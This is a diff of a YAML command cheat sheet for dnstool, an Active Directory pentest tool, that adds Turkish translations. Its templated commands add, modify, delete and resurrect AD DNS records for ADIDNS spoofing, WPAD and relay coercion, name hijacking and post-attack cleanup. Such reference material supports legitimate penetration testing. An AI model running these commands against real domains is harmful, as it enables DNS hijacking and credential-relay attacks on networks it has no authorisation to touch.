@@ -2,50 +2,98 @@ tool: dnstool
 tags: [active-directory, pentest, dns, ldap, impacket]
 
 actions:
- - title: dnstool - query a record
-   desc: |
-     Shows the existing DNS record for a name, default action is query.
-     Start here to verify a spoof target before adding or modifying.
+ - title:
+     en: dnstool - query a record
+     tr: dnstool - kayıt sorgulama
+   desc:
+     en: |
+       Shows the existing DNS record for a name, default action is query.
+       Start here to verify a spoof target before adding or modifying.
+     tr: |
+       Bir isme ait mevcut DNS kaydını gösterir, varsayılan işlem query'dir.
+       Ekleme veya değiştirme öncesi sahte hedefi doğrulamak için buradan başlayın.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a query"
 
- - title: dnstool - add a record
-   desc: |
-     Adds a new A record pointing a hostname to your IP.
-     Core primitive for ADIDNS spoofing, relay coercion, and WPAD attacks.
+ - title:
+     en: dnstool - add a record
+     tr: dnstool - kayıt ekleme
+   desc:
+     en: |
+       Adds a new A record pointing a hostname to your IP.
+       Core primitive for ADIDNS spoofing, relay coercion, and WPAD attacks.
+     tr: |
+       Bir hostname'i sizin IP'nize yönlendiren yeni bir A kaydı ekler.
+       ADIDNS sahteciliği, relay zorlama ve WPAD saldırıları için temel işlemdir.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a add -t A -d {{ip|10.10.10.10}}"
 
- - title: dnstool - modify a record
-   desc: |
-     Changes the IP of an existing DNS record.
-     Use to hijack a legitimate name without deleting it first.
+ - title:
+     en: dnstool - modify a record
+     tr: dnstool - kayıt değiştirme
+   desc:
+     en: |
+       Changes the IP of an existing DNS record.
+       Use to hijack a legitimate name without deleting it first.
+     tr: |
+       Mevcut bir DNS kaydının IP adresini değiştirir.
+       Meşru bir ismi önce silmeden ele geçirmek için kullanın.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|victim.domain.local}} -a modify -t A -d {{ip|10.10.10.10}}"
 
- - title: dnstool - remove a record
-   desc: |
-     Marks a DNS record for cleanup from the cache.
-     Quieter than ldapdelete; the scavenging process removes it.
+ - title:
+     en: dnstool - remove a record
+     tr: dnstool - kayıt kaldırma
+   desc:
+     en: |
+       Marks a DNS record for cleanup from the cache.
+       Quieter than ldapdelete; the scavenging process removes it.
+     tr: |
+       Bir DNS kaydını önbellekten temizlenmek üzere işaretler.
+       ldapdelete'ten daha sessizdir; temizleme (scavenging) işlemi kaydı siler.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a remove"
 
- - title: dnstool - delete record from ldap
-   desc: |
-     Force-deletes the DNS record object directly from LDAP.
-     Immediate cleanup after an attack; use when remove is too slow.
+ - title:
+     en: dnstool - delete record from ldap
+     tr: dnstool - kaydı ldap üzerinden silme
+   desc:
+     en: |
+       Force-deletes the DNS record object directly from LDAP.
+       Immediate cleanup after an attack; use when remove is too slow.
+     tr: |
+       DNS kayıt nesnesini doğrudan LDAP üzerinden zorla siler.
+       Saldırı sonrası anında temizlik sağlar; remove işlemi yavaş kaldığında kullanın.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a ldapdelete"
 
- - title: dnstool - resurrect tombstoned record
-   desc: |
-     Restores a deleted (tombstoned) DNS record object.
-     Useful when a name was removed but its LDAP object still exists.
+ - title:
+     en: dnstool - resurrect tombstoned record
+     tr: dnstool - silinmiş (tombstoned) kaydı canlandırma
+   desc:
+     en: |
+       Restores a deleted (tombstoned) DNS record object.
+       Useful when a name was removed but its LDAP object still exists.
+     tr: |
+       Silinmiş (tombstoned) bir DNS kayıt nesnesini geri yükler.
+       Bir isim silinmiş ancak LDAP nesnesi hâlâ mevcutsa kullanışlıdır.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} -r {{record|evil.domain.local}} -a resurrect"
 
- - title: dnstool - print all zones
-   desc: |
-     Lists every DNS zone on the server without other changes.
-     Recon step to find writable zones for spoofing.
+ - title:
+     en: dnstool - print all zones
+     tr: dnstool - tüm zonları listeleme
+   desc:
+     en: |
+       Lists every DNS zone on the server without other changes.
+       Recon step to find writable zones for spoofing.
+     tr: |
+       Başka değişiklik yapmadan sunucudaki tüm DNS zonlarını listeler.
+       Sahtecilik için yazılabilir zonları bulmaya yönelik keşif adımıdır.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} --print-zones"
 
- - title: dnstool - add with custom ttl and zone
-   desc: |
-     Adds a record in a specific zone with a custom TTL.
-     Short TTLs speed up propagation during time-sensitive coercion.
+ - title:
+     en: dnstool - add with custom ttl and zone
+     tr: dnstool - özel ttl ve zon ile kayıt ekleme
+   desc:
+     en: |
+       Adds a record in a specific zone with a custom TTL.
+       Short TTLs speed up propagation during time-sensitive coercion.
+     tr: |
+       Belirli bir zona özel TTL değeriyle kayıt ekler.
+       Kısa TTL'ler zamana duyarlı zorlama saldırılarında yayılımı hızlandırır.
    command: "dnstool.py {{dc_host}} -u {{domain}}/{{username}} -p {{password}} --zone {{zone|domain.local}} -r {{record|evil}} -a add -t A -d {{ip|10.10.10.10}} --ttl {{ttl|60}}"
